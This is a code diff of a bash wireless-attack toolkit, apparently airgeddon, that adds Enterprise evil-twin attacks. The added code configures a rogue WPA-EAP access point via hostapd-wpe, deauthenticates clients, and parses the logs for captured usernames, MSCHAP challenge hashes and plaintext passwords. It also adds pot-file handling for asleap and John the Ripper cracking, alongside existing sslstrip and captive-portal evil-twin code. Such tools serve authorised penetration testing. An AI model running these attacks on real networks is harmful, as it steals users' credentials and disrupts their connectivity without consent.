-	set_control_script
-	launch_control_window
+	set_et_control_script
+	launch_et_control_window
 	if [ ${captive_portal_mode} = "dnsblackhole" ]; then
 		launch_dns_blackhole
 	fi
@@ -6155,7 +7507,7 @@ function set_hostapd_config() {
 	tmpfiles_toclean=1
 	rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1
 
-	different_mac_digit=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 | head -n 100 | grep -v "${bssid:10:1}" | head -c 1)
+	different_mac_digit=$(xxd -p -u -l 100 < /dev/urandom  | sed "s/${bssid:10:1}//g" | head -c 1)
 	et_bssid=${bssid::10}${different_mac_digit}${bssid:11:6}
 
 	{
@@ -6176,12 +7528,67 @@ function set_hostapd_config() {
 	} >> "${tmpdir}${hostapd_file}"
 }
 
-#Launch hostapd fake Access Point
+#Create configuration file for hostapd
+function set_hostapd_wpe_config() {
+
+	debug_print
+
+	tmpfiles_toclean=1
+	rm -rf "${tmpdir}${hostapd_wpe_file}" > /dev/null 2>&1
+
+	different_mac_digit=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 | head -n 100 | grep -v "${bssid:10:1}" | head -c 1)
+	et_bssid=${bssid::10}${different_mac_digit}${bssid:11:6}
+
+	{
+	echo -e "interface=${interface}"
+	echo -e "driver=nl80211"
+	echo -e "ssid=${essid}"
+	echo -e "bssid=${et_bssid}"
+	} >> "${tmpdir}${hostapd_wpe_file}"
+
+	if [[ "${channel}" -gt 14 ]]; then
+		et_channel=$(shuf -i 1-11 -n 1)
+	else
+		et_channel="${channel}"
+	fi
+
+	{
+	echo -e "channel=${et_channel}"
+	echo -e "wpe_logfile=/dev/null"
+	echo -e "eap_server=1"
+	echo -e "eap_fast_a_id=101112131415161718191a1b1c1d1e1f"
+	echo -e "eap_fast_a_id_info=hostapd-wpe"
+	echo -e "eap_fast_prov=3"
+	echo -e "ieee8021x=1"
+	echo -e "pac_key_lifetime=604800"
+	echo -e "pac_key_refresh_time=86400"
+	echo -e "pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f"
+	echo -e "wpa=2"
+	echo -e "wpa_key_mgmt=WPA-EAP"
+	echo -e "wpa_pairwise=CCMP"
+	echo -e "rsn_pairwise=CCMP"
+	echo -e "eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user"
+	} >> "${tmpdir}${hostapd_wpe_file}"
+
+	#TODO review certificate options for future versions. For now, using defaults
+	{
+	echo -e "ca_cert=/etc/hostapd-wpe/certs/ca.pem"
+	echo -e "server_cert=/etc/hostapd-wpe/certs/server.pem"
+	echo -e "private_key=/etc/hostapd-wpe/certs/server.key"
+	echo -e "private_key_passwd=whatever"
+	} >> "${tmpdir}${hostapd_wpe_file}"
+}
+
+#Launch hostapd and hostapd-wpe fake Access Point
 function launch_fake_ap() {
 
 	debug_print
 
-	killall hostapd > /dev/null 2>&1
+	if [ -n "${enterprise_mode}" ]; then
+		killall hostapd-wpe > /dev/null 2>&1
+	else
+		killall hostapd > /dev/null 2>&1
+	fi
 	${airmon} check kill > /dev/null 2>&1
 	nm_processes_killed=1
 
@@ -6190,18 +7597,30 @@ function launch_fake_ap() {
 	fi
 
 	recalculate_windows_sizes
-	case ${et_mode} in
-		"et_onlyap")
-			hostapd_scr_window_position=${g1_topleft_window}
-		;;
-		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
-			hostapd_scr_window_position=${g3_topleft_window}
-		;;
-		"et_sniffing_sslstrip")
-			hostapd_scr_window_position=${g4_topleft_window}
-		;;
-	esac
-	xterm -hold -bg black -fg blue -geometry "${hostapd_scr_window_position}" -T "AP" -e "hostapd \"${tmpdir}${hostapd_file}\"" > /dev/null 2>&1 &
+	local command
+	local log_command
+
+	if [ -n "${enterprise_mode}" ]; then
+		rm -rf "${tmpdir}${hostapd_wpe_log}" > /dev/null 2>&1
+		command="hostapd-wpe \"${tmpdir}${hostapd_wpe_file}\""
+		log_command=" | tee ${tmpdir}${hostapd_wpe_log}"
+		hostapd_scr_window_position=${g1_topleft_window}
+	else
+		command="hostapd \"${tmpdir}${hostapd_file}\""
+		log_command=""
+		case ${et_mode} in
+			"et_onlyap")
+				hostapd_scr_window_position=${g1_topleft_window}
+			;;
+			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
+				hostapd_scr_window_position=${g3_topleft_window}
+			;;
+			"et_sniffing_sslstrip")
+				hostapd_scr_window_position=${g4_topleft_window}
+			;;
+		esac
+	fi
+	xterm -hold -bg black -fg green -geometry "${hostapd_scr_window_position}" -T "AP" -e "${command}${log_command}" > /dev/null 2>&1 &
 	et_processes+=($!)
 	sleep 3
 }
@@ -6264,7 +7683,7 @@ function set_dhcp_config() {
 		echo -e "lease-file-name \"${possible_dhcp_leases_files[${key_leases_found}]}\";" >> "${tmpdir}${dhcpd_file}"
 		chmod a+w "${possible_dhcp_leases_files[${key_leases_found}]}" > /dev/null 2>&1
 	else
-		touch "${possible_dhcp_leases_files[0]}"
+		touch "${possible_dhcp_leases_files[0]}" > /dev/null 2>&1
 		echo -e "lease-file-name \"${possible_dhcp_leases_files[0]}\";" >> "${tmpdir}${dhcpd_file}"
 		chmod a+w "${possible_dhcp_leases_files[0]}" > /dev/null 2>&1
 	fi
@@ -6397,7 +7816,7 @@ function launch_dhcp_server() {
 	sleep 2
 }
 
-#Execute DoS for Evil Twin attacks
+#Execute DoS for Evil Twin and Enterprise attacks
 function exec_et_deauth() {
 
 	debug_print
@@ -6422,17 +7841,21 @@ function exec_et_deauth() {
 	esac
 
 	recalculate_windows_sizes
-	case ${et_mode} in
-		"et_onlyap")
-			deauth_scr_window_position=${g1_bottomright_window}
-		;;
-		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
-			deauth_scr_window_position=${g3_bottomleft_window}
-		;;
-		"et_sniffing_sslstrip")
-			deauth_scr_window_position=${g4_bottomleft_window}
-		;;
-	esac
+	if [ -n "${enterprise_mode}" ]; then
+		deauth_scr_window_position=${g1_bottomleft_window}
+	else
+		case ${et_mode} in
+			"et_onlyap")
+				deauth_scr_window_position=${g1_bottomright_window}
+			;;
+			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
+				deauth_scr_window_position=${g3_bottomleft_window}
+			;;
+			"et_sniffing_sslstrip")
+				deauth_scr_window_position=${g4_bottomleft_window}
+			;;
+		esac
+	fi
 
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		dos_pursuit_mode_pids=()
@@ -6455,7 +7878,7 @@ function set_wps_attack_script() {
 	rm -rf "${tmpdir}${wps_out_file}" > /dev/null 2>&1
 
 	bully_reaver_band_modifier=""
-	if [[ "${wps_channel}" -gt 14 ]] && [[ "${interface_supported_bands}" != "${band_24ghz}" ]]; then
+	if [[ "${wps_channel}" -gt 14 ]] && [[ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 1 ]]; then
 		bully_reaver_band_modifier="-5"
 	fi
 
@@ -6849,14 +8272,205 @@ function set_wps_attack_script() {
 	sleep 1
 }
 
-#Create here-doc bash script used for control windows on Evil Twin attacks
-function set_control_script() {
+#Create here-doc bash script used for control windows on Enterprise attacks
+function set_enterprise_control_script() {
 
 	debug_print
 
-	rm -rf "${tmpdir}${control_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${control_enterprise_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
+	mkdir "${tmpdir}${enterprisedir}" > /dev/null 2>&1
 
-	exec 7>"${tmpdir}${control_file}"
+	exec 7>"${tmpdir}${control_enterprise_file}"
+
+	local control_msg
+	if [ ${enterprise_mode} = "smooth" ]; then
+		control_msg=${enterprise_texts[${language},3]}
+	else
+		control_msg=${enterprise_texts[${language},4]}
+	fi
+
+	cat >&7 <<-EOF
+		#!/usr/bin/env bash
+		enterprise_heredoc_mode="${enterprise_mode}"
+		path_to_processes="${tmpdir}${enterprisedir}${enterprise_processesfile}"
+		wpe_logfile="${tmpdir}${hostapd_wpe_log}"
+		success_file="${tmpdir}${enterprisedir}${enterprise_successfile}"
+		done_msg="${yellow_color}${enterprise_texts[${language},9]}${normal_color}"
+		log_reminder_msg="${pink_color}${enterprise_texts[${language},10]}: [${normal_color}${enterprise_completepath}${pink_color}]${normal_color}"
+	EOF
+
+	cat >&7 <<-'EOF'
+		#Kill Evil Twin Enterprise processes
+		function kill_enterprise_windows() {
+
+			readarray -t ENTERPRISE_PROCESSES_TO_KILL < <(cat < "${path_to_processes}" 2> /dev/null)
+			for item in "${ENTERPRISE_PROCESSES_TO_KILL[@]}"; do
+				kill "${item}" &> /dev/null
+			done
+		}
+
+		#Check if a hash or a password was captured (0=hash, 1=plaintextpass, 2=both)
+		function check_captured() {
+
+			local hash_captured=0
+			local plaintext_password_captured=0
+			readarray -t ENTERPRISE_LINES_TO_PARSE < <(cat < "${wpe_logfile}" 2> /dev/null)
+			for item in "${ENTERPRISE_LINES_TO_PARSE[@]}"; do
+
+				if [[ "${item}" =~ challenge: ]]; then
+					hash_captured=1
+				elif [[ "${item}" =~ password: ]]; then
+					plaintext_password_captured=1
+				fi
+			done
+
+			if [[ ${hash_captured} -eq 1 ]] || [[ ${plaintext_password_captured} -eq 1 ]]; then
+				touch "${success_file}" > /dev/null 2>&1
+			fi
+
+			if [[ ${hash_captured} -eq 1 ]] && [[ ${plaintext_password_captured} -eq 0 ]]; then
+				echo 0 > "${success_file}" 2> /dev/null
+				return 0
+			elif [[ ${hash_captured} -eq 0 ]] && [[ ${plaintext_password_captured} -eq 1 ]]; then
+				echo 1 > "${success_file}" 2> /dev/null
+				return 0
+			elif [[ ${hash_captured} -eq 1 ]] && [[ ${plaintext_password_captured} -eq 1 ]]; then
+				echo 2 > "${success_file}" 2> /dev/null
+				return 0
+			fi
+
+			return 1
+		}
+
+		#Set captured hashes and passwords counters
+		function set_captured_counters() {
+
+			local new_username_found=0
+			declare -A lines_and_usernames
+
+			readarray -t CAPTURED_USERNAMES < <(grep -n -E "username:" "${wpe_logfile}" | sort -k 2,2 | uniq --skip-fields=1 2> /dev/null)
+			for item in "${CAPTURED_USERNAMES[@]}"; do
+				[[ ${item} =~ ([0-9]+):.*username:[[:blank:]]+(.*) ]] && line_number="${BASH_REMATCH[1]}" && username="${BASH_REMATCH[2]}"
+				lines_and_usernames["${username}"]="${line_number}"
+			done
+
+			hashes_counter=0
+			plaintext_pass_counter=0
+			for item2 in "${lines_and_usernames[@]}"; do
+				local line_to_check=$((item2 + 1))
+				local text_to_check=$(sed "${line_to_check}q;d" "${wpe_logfile}" 2> /dev/null)
+				if [[ "${text_to_check}" =~ challenge: ]]; then
+					hashes_counter=$((hashes_counter + 1))
+				elif [[ "${text_to_check}" =~ password: ]]; then
+					plaintext_pass_counter=$((plaintext_pass_counter + 1))
+				fi
+			done
+		}
+
+		#Get last captured user name
+		function get_last_username() {
+
+			line_with_last_user=$(grep -E "username:" "${wpe_logfile}" | tail -1)
+			[[ ${line_with_last_user} =~ username:[[:blank:]]+(.*) ]] && last_username="${BASH_REMATCH[1]}"
+		}
+	EOF
+
+	cat >&7 <<-'EOF'
+
+		date_counter=$(date +%s)
+		last_username=""
+		break_on_next_loop=0
+		while true; do
+			if [ ${break_on_next_loop} -eq 1 ]; then
+				tput ed
+			fi
+	EOF
+
+	cat >&7 <<-EOF
+			if [ "${channel}" != "${et_channel}" ]; then
+				et_control_window_channel="${et_channel} (5Ghz: ${channel})"
+			else
+				et_control_window_channel="${channel}"
+			fi
+			echo -e "\t${yellow_color}${enterprise_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${enterprise_texts[${language},1]}: ${normal_color}\${et_control_window_channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
+			echo
+			echo -e "\t${green_color}${enterprise_texts[${language},2]}${normal_color}"
+	EOF
+
+	cat >&7 <<-'EOF'
+			hours=$(date -u --date @$(($(date +%s) - date_counter)) +%H)
+			mins=$(date -u --date @$(($(date +%s) - date_counter)) +%M)
+			secs=$(date -u --date @$(($(date +%s) - date_counter)) +%S)
+			echo -e "\t${hours}:${mins}:${secs}"
+
+			if [ ${break_on_next_loop} -eq 0 ]; then
+	EOF
+
+	cat >&7 <<-EOF
+				echo -e "\t${pink_color}${control_msg}${normal_color}\n"
+			fi
+	EOF
+
+	cat >&7 <<-'EOF'
+			echo
+			if [ -z "${last_username}" ]; then
+	EOF
+
+	cat >&7 <<-EOF
+				echo -e "\t${blue_color}${enterprise_texts[${language},6]}${normal_color}"
+				echo -e "\t${blue_color}${enterprise_texts[${language},7]}${normal_color}: 0"
+				echo -e "\t${blue_color}${enterprise_texts[${language},8]}${normal_color}: 0"
+			else
+				last_name_to_print="${blue_color}${enterprise_texts[${language},5]}:${normal_color}"
+				hashes_counter_message="${blue_color}${enterprise_texts[${language},7]}:${normal_color}"
+				plaintext_pass_counter_message="${blue_color}${enterprise_texts[${language},8]}:${normal_color}"
+	EOF
+
+	cat >&7 <<-'EOF'
+				tput el && echo -e "\t${last_name_to_print} ${last_username}"
+				echo -e "\t${hashes_counter_message} ${hashes_counter}"
+				echo -e "\t${plaintext_pass_counter_message} ${plaintext_pass_counter}"
+			fi
+
+			if [ ${break_on_next_loop} -eq 1 ]; then
+				kill_enterprise_windows
+				break
+			fi
+
+			if check_captured; then
+				get_last_username
+				set_captured_counters
+			 	if [ "${enterprise_heredoc_mode}" = "smooth" ]; then
+					break_on_next_loop=1
+				fi
+			fi
+
+			echo -ne "\033[K\033[u"
+			sleep 0.3
+		done
+
+		if [ "${enterprise_heredoc_mode}" = "smooth" ]; then
+			echo
+			echo -e "\t${log_reminder_msg}"
+			echo
+			echo -e "\t${done_msg}"
+			exit 0
+		fi
+	EOF
+
+	exec 7>&-
+	sleep 1
+}
+
+#Create here-doc bash script used for control windows on Evil Twin attacks
+function set_et_control_script() {
+
+	debug_print
+
+	rm -rf "${tmpdir}${control_et_file}" > /dev/null 2>&1
+
+	exec 7>"${tmpdir}${control_et_file}"
 
 	cat >&7 <<-EOF
 		#!/usr/bin/env bash
@@ -6868,7 +8482,7 @@ function set_control_script() {
 	EOF
 
 	cat >&7 <<-EOF
-			path_to_processes="${tmpdir}${webdir}${processesfile}"
+			path_to_processes="${tmpdir}${webdir}${et_processesfile}"
 			attempts_path="${tmpdir}${webdir}${attemptsfile}"
 			attempts_text="${blue_color}${et_misc_texts[${language},20]}:${normal_color}"
 			last_password_msg="${blue_color}${et_misc_texts[${language},21]}${normal_color}"
@@ -7013,7 +8627,7 @@ function set_control_script() {
 	EOF
 
 	cat >&7 <<-EOF
-				if [ -f "${tmpdir}${webdir}${successfile}" ]; then
+				if [ -f "${tmpdir}${webdir}${et_successfile}" ]; then
 					clear
 					echo -e "\t${yellow_color}${et_misc_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${et_misc_texts[${language},1]}: ${normal_color}${channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
 					echo
@@ -7090,12 +8704,22 @@ function launch_dns_blackhole() {
 	debug_print
 
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "DNS" -e "${optional_tools_names[12]} -i ${interface}" > /dev/null 2>&1 &
+	xterm -hold -bg black -fg blue -geometry "${g4_middleright_window}" -T "DNS" -e "${optional_tools_names[12]} -i ${interface}" > /dev/null 2>&1 &
 	et_processes+=($!)
 }
 
+#Launch control window for Enterprise attacks
+function launch_enterprise_control_window() {
+
+	debug_print
+
+	recalculate_windows_sizes
+	xterm -hold -bg black -fg white -geometry "${g1_topright_window}" -T "Control" -e "bash \"${tmpdir}${control_enterprise_file}\"" > /dev/null 2>&1 &
+	enterprise_process_control_window=$!
+}
+
 #Launch control window for Evil Twin attacks
-function launch_control_window() {
+function launch_et_control_window() {
 
 	debug_print
 
@@ -7121,7 +8745,7 @@ function launch_control_window() {
 			control_scr_window_position=${g4_topright_window}
 		;;
 	esac
-	xterm -hold -bg black -fg white -geometry "${control_scr_window_position}" -T "Control" -e "bash \"${tmpdir}${control_file}\"" > /dev/null 2>&1 &
+	xterm -hold -bg black -fg white -geometry "${control_scr_window_position}" -T "Control" -e "bash \"${tmpdir}${control_et_file}\"" > /dev/null 2>&1 &
 	et_process_control_window=$!
 }
 
@@ -7307,7 +8931,7 @@ function set_captive_portal_page() {
 	EOF
 
 	cat >&4 <<-EOF
-				touch "${tmpdir}${webdir}${successfile}"
+				touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
 				echo '${et_misc_texts[${captive_portal_language},18]}'
 				et_successful=1
 			else
@@ -7379,7 +9003,7 @@ function launch_sslstrip() {
 
 	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "Sslstrip" -e "sslstrip -w \"${tmpdir}${sslstrip_file}\" -p -l ${sslstrip_port} -f -k" > /dev/null 2>&1 &
+	xterm -hold -bg black -fg blue -geometry "${g4_middleright_window}" -T "Sslstrip" -e "sslstrip -w \"${tmpdir}${sslstrip_file}\" -p -l ${sslstrip_port} -f -k" > /dev/null 2>&1 &
 	et_processes+=($!)
 }
 
@@ -7816,11 +9440,21 @@ function write_et_processes() {
 	debug_print
 
 	for item in "${et_processes[@]}"; do
-		echo "${item}" >> "${tmpdir}${webdir}${processesfile}"
+		echo "${item}" >> "${tmpdir}${webdir}${et_processesfile}"
 	done
 }
 
-#Kill the Evil Twin processes
+#Write on a file the id of the Enterprise Evil Twin attack processes
+function write_enterprise_processes() {
+
+	debug_print
+
+	for item in "${et_processes[@]}"; do
+		echo "${item}" >> "${tmpdir}${enterprisedir}${enterprise_processesfile}"
+	done
+}
+
+#Kill the Evil Twin and Enterprise processes
 function kill_et_windows() {
 
 	debug_print
@@ -7840,8 +9474,14 @@ function kill_et_windows() {
 	for item in "${et_processes[@]}"; do
 		kill "${item}" &> /dev/null
 	done
-	kill ${et_process_control_window} &> /dev/null
-	killall hostapd > /dev/null 2>&1
+
+	if [ -n "${enterprise_mode}" ]; then
+		kill ${enterprise_process_control_window} &> /dev/null
+		killall hostapd-wpe > /dev/null 2>&1
+	else
+		kill ${et_process_control_window} &> /dev/null
+		killall hostapd > /dev/null 2>&1
+	fi
 }
 
 #Kill DoS pursuit mode processes
@@ -8221,21 +9861,41 @@ function validate_path() {
 
 	debug_print
 
-	dirname=${1%/*}
-
-	if [[ ! -d "${dirname}" ]] || [[ "${dirname}" = "." ]]; then
-		language_strings "${language}" 156 "red"
-		return 1
-	fi
-
-	if ! check_write_permissions "${dirname}"; then
-		language_strings "${language}" 157 "red"
-		return 1
-	fi
-
 	lastcharmanualpath=${1: -1}
-	if [[ "${lastcharmanualpath}" = "/" ]] || [[ -d "${1}" ]]; then
 
+	if [ "${2}" = "enterprisepot" ]; then
+		dirname=$(dirname "${1}")
+
+		if [ -d "${dirname}" ]; then
+			if ! check_write_permissions "${dirname}"; then
+				language_strings "${language}" 157 "red"
+				return 1
+			fi
+		else
+			if ! dir_permission_check "${1}"; then
+				language_strings "${language}" 526 "red"
+				return 1
+			fi
+		fi
+
+		if [ "${lastcharmanualpath}" != "/" ]; then
+			pathname="${1}/"
+		fi
+	else
+		dirname=${1%/*}
+
+		if [[ ! -d "${dirname}" ]] || [[ "${dirname}" = "." ]]; then
+			language_strings "${language}" 156 "red"
+			return 1
+		fi
+
+		if ! check_write_permissions "${dirname}"; then
+			language_strings "${language}" 157 "red"
+			return 1
+		fi
+	fi
+
+	if [[ "${lastcharmanualpath}" = "/" ]] || [[ -d "${1}" ]] || [[ "${2}" = "enterprisepot" ]]; then
 		if [ "${lastcharmanualpath}" != "/" ]; then
 			pathname="${1}/"
 		else
@@ -8251,9 +9911,17 @@ function validate_path() {
 				suggested_filename="${aircrackpot_filename}"
 				aircrackpotenteredpath+="${aircrackpot_filename}"
 			;;
+			"jtrpot")
+				suggested_filename="${jtrpot_filename}"
+				jtrpotenteredpath+="${jtrpot_filename}"
+			;;
 			"hashcatpot")
 				suggested_filename="${hashcatpot_filename}"
 				potenteredpath+="${hashcatpot_filename}"
+			;;
+			"asleappot")
+				suggested_filename="${asleappot_filename}"
+				asleapenteredpath+="${asleappot_filename}"
 			;;
 			"ettercaplog")
 				suggested_filename="${default_ettercaplogfilename}"
@@ -8275,6 +9943,31 @@ function validate_path() {
 				suggested_filename="${weppot_filename}"
 				weppotenteredpath+="${weppot_filename}"
 			;;
+			"enterprisepot")
+				enterprise_potpath="${pathname}"
+				enterprise_basepath=$(dirname "${enterprise_potpath}")
+
+				if [[ "${enterprise_basepath}" != "." ]]; then
+					enterprise_dirname=$(basename "${enterprise_potpath}")
+				fi
+
+				if [ "${enterprise_basepath}" != "/" ]; then
+					enterprise_basepath+="/"
+				fi
+
+				if [ "${enterprise_dirname}" != "${enterprisepot_suggested_dirname}" ]; then
+					enterprise_completepath="${enterprise_potpath}${enterprisepot_suggested_dirname}/"
+				else
+					enterprise_completepath="${enterprise_potpath}"
+					if [ "${enterprise_potpath: -1}" != "/" ]; then
+						enterprise_completepath+="/"
+					fi
+				fi
+
+				echo
+				language_strings "${language}" 158 "yellow"
+				return 0
+			;;
 		esac
 
 		echo
@@ -8282,8 +9975,26 @@ function validate_path() {
 		return 0
 	fi
 
+	echo
 	language_strings "${language}" 158 "yellow"
 	return 0
+}
+
+#It checks the write permissions of a directory recursively
+function dir_permission_check() {
+
+	debug_print
+
+	if [ -e "${1}" ]; then
+		if [ -d "${1}" ] && check_write_permissions "${1}" && [ -x "${1}" ]; then
+			return 0
+		else
+			return 1
+		fi
+	else
+		dir_permission_check "$(dirname "${1}")"
+		return $?
+	fi
 }
 
 #Check for write permissions on a given path
@@ -8343,6 +10054,16 @@ function read_path() {
 			read_and_clean_path "enteredpath"
 			check_file_exists "${enteredpath}"
 		;;
+		"targethashcatenterprisefilefordecrypt")
+			language_strings "${language}" 188 "green"
+			read_and_clean_path "hashcatenterpriseenteredpath"
+			check_file_exists "${hashcatenterpriseenteredpath}"
+		;;
+		"targetjtrenterprisefilefordecrypt")
+			language_strings "${language}" 188 "green"
+			read_and_clean_path "jtrenterpriseenteredpath"
+			check_file_exists "${jtrenterpriseenteredpath}"
+		;;
 		"rules")
 			language_strings "${language}" 242 "green"
 			read_and_clean_path "RULES"
@@ -8356,6 +10077,14 @@ function read_path() {
 			fi
 			validate_path "${aircrackpotenteredpath}" "${1}"
 		;;
+		"jtrpot")
+			language_strings "${language}" 611 "green"
+			read_and_clean_path "jtrpotenteredpath"
+			if [ -z "${jtrpotenteredpath}" ]; then
+				jtrpotenteredpath="${jtr_potpath}"
+			fi
+			validate_path "${jtrpotenteredpath}" "${1}"
+		;;
 		"hashcatpot")
 			language_strings "${language}" 233 "green"
 			read_and_clean_path "potenteredpath"
@@ -8363,6 +10092,14 @@ function read_path() {
 				potenteredpath="${hashcat_potpath}"
 			fi
 			validate_path "${potenteredpath}" "${1}"
+		;;
+		"asleappot")
+			language_strings "${language}" 555 "green"
+			read_and_clean_path "asleapenteredpath"
+			if [ -z "${asleapenteredpath}" ]; then
+				asleapenteredpath="${asleap_potpath}"
+			fi
+			validate_path "${asleapenteredpath}" "${1}"
 		;;
 		"ettercaplog")
 			language_strings "${language}" 303 "green"
@@ -8416,6 +10153,14 @@ function read_path() {
 				weppotenteredpath="${wep_potpath}"
 			fi
 			validate_path "${weppotenteredpath}" "${1}"
+		;;
+		"enterprisepot")
+			language_strings "${language}" 525 "blue"
+			read_and_clean_path "enterprisepotenteredpath"
+			if [ -z "${enterprisepotenteredpath}" ]; then
+				enterprisepotenteredpath="${enterprise_potpath}"
+			fi
+			validate_path "${enterprisepotenteredpath}" "${1}"
 		;;
 	esac
 
@@ -8575,7 +10320,11 @@ function explore_for_targets_option() {
 				language_strings "${language}" 67 "yellow"
 			;;
 			"WPA")
-				language_strings "${language}" 361 "yellow"
+				if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]]; then
+					language_strings "${language}" 527 "yellow"
+				else
+					language_strings "${language}" 361 "yellow"
+				fi
 			;;
 		esac
 	else
@@ -8588,7 +10337,7 @@ function explore_for_targets_option() {
 	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
 	rm -rf "${tmpdir}clts.csv" > /dev/null 2>&1
 
-	if [ "${interface_supported_bands}" = "${band_24ghz}" ]; then
+	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
 		airodump_band_modifier="bg"
 	else
 		airodump_band_modifier="abg"
@@ -8612,12 +10361,13 @@ function explore_for_targets_option() {
 
 	rm -rf "${tmpdir}nws.txt" > /dev/null 2>&1
 	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
-	i=0
-	while IFS=, read -r exp_mac _ _ exp_channel _ exp_enc _ _ exp_power _ _ _ exp_idlength exp_essid _; do
+	local i=0
+	local enterprise_network_counter
+	while IFS=, read -r exp_mac _ _ exp_channel _ exp_enc _ exp_auth exp_power _ _ _ exp_idlength exp_essid _; do
 
 		chars_mac=${#exp_mac}
 		if [ "${chars_mac}" -ge 17 ]; then
-			i=$((i+1))
+			i=$((i + 1))
 			if [[ ${exp_power} -lt 0 ]]; then
 				if [[ ${exp_power} -eq -1 ]]; then
 					exp_power=0
@@ -8641,9 +10391,24 @@ function explore_for_targets_option() {
 
 			exp_enc=$(echo "${exp_enc}" | awk '{print $1}')
 
-			echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
+			if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]]; then
+				if [[ "${exp_auth}" =~ "MGT" ]]; then
+					enterprise_network_counter=$((enterprise_network_counter + 1))
+					echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
+				fi
+			else
+				echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${tmpdir}nws.txt"
+			fi
 		fi
 	done < "${tmpdir}nws.csv"
+
+	if [[ -n "${2}" ]] && [[ "${2}" = "enterprise" ]] && [[ ${enterprise_network_counter} -eq 0 ]]; then
+		echo
+		language_strings "${language}" 612 "red"
+		language_strings "${language}" 115 "read"
+		return 1
+	fi
+
 	sort -t "," -d -k 4 "${tmpdir}nws.txt" > "${tmpdir}wnws.txt"
 	select_target
 }
@@ -8676,7 +10441,7 @@ function explore_for_wps_targets_option() {
 	fi
 
 	wash_band_modifier=""
-	if [ "${interface_supported_bands}" != "${band_24ghz}" ]; then
+	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 1 ]; then
 		if check_dual_scan_on_wash; then
 			wash_band_modifier="-2 -5"
 		else
@@ -8707,7 +10472,7 @@ function explore_for_wps_targets_option() {
 			wash_header_found=1
 			break
 		else
-			wash_line_counter=$((wash_line_counter+1))
+			wash_line_counter=$((wash_line_counter + 1))
 		fi
 	done
 
@@ -8732,18 +10497,18 @@ function explore_for_wps_targets_option() {
 	language_strings "${language}" 349 "green"
 	print_large_separator
 
-	i=0
-	wash_counter=0
+	local i=0
+	local wash_counter=0
 	declare -A wps_lockeds
 	wps_lockeds[${wash_counter}]="No"
 	while IFS=, read -r expwps_line; do
 
-		i=$((i+1))
+		i=$((i + 1))
 
 		if [ ${i} -le ${wash_start_data_line} ]; then
 			continue
 		else
-			wash_counter=$((wash_counter+1))
+			wash_counter=$((wash_counter + 1))
 
 			if [ ${wash_counter} -le 9 ]; then
 				wpssp1=" "
@@ -8856,10 +10621,10 @@ function select_target() {
 	echo
 	language_strings "${language}" 69 "green"
 	print_large_separator
-	i=0
+	local i=0
 	while IFS=, read -r exp_mac exp_channel exp_power exp_essid exp_enc; do
 
-		i=$((i+1))
+		i=$((i + 1))
 
 		if [ ${i} -le 9 ]; then
 			sp1=" "
@@ -9028,7 +10793,7 @@ function wps_pin_database_prerequisites() {
 	fi
 }
 
-#Manage and validate the prerequisites for Evil Twin attacks
+#Manage and validate the prerequisites for Evil Twin and Enterprise attacks
 function et_prerequisites() {
 
 	debug_print
@@ -9037,30 +10802,46 @@ function et_prerequisites() {
 		return
 	fi
 
-	current_menu="evil_twin_attacks_menu"
 	clear
-
-	case ${et_mode} in
-		"et_onlyap")
-			language_strings "${language}" 270 "title"
-		;;
-		"et_sniffing")
-			language_strings "${language}" 291 "title"
-		;;
-		"et_sniffing_sslstrip")
-			language_strings "${language}" 292 "title"
-		;;
-		"et_sniffing_sslstrip2")
-			language_strings "${language}" 397 "title"
-		;;
-		"et_captive_portal")
-			language_strings "${language}" 293 "title"
-		;;
-	esac
+	if [ -n "${enterprise_mode}" ]; then
+		current_menu="enterprise_attacks_menu"
+		case ${enterprise_mode} in
+			"smooth")
+				language_strings "${language}" 522 "title"
+			;;
+			"noisy")
+				language_strings "${language}" 523 "title"
+			;;
+		esac
+	else
+		current_menu="evil_twin_attacks_menu"
+		case ${et_mode} in
+			"et_onlyap")
+				language_strings "${language}" 270 "title"
+			;;
+			"et_sniffing")
+				language_strings "${language}" 291 "title"
+			;;
+			"et_sniffing_sslstrip")
+				language_strings "${language}" 292 "title"
+			;;
+			"et_sniffing_sslstrip2")
+				language_strings "${language}" 397 "title"
+			;;
+			"et_captive_portal")
+				language_strings "${language}" 293 "title"
+			;;
+		esac
+	fi
 
 	print_iface_selected
-	print_et_target_vars
-	print_iface_internet_selected
+	if [ -n "${enterprise_mode}" ]; then
+		print_all_target_vars
+	else
+		print_et_target_vars
+		print_iface_internet_selected
+	fi
+
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		language_strings "${language}" 512 "blue"
 	fi
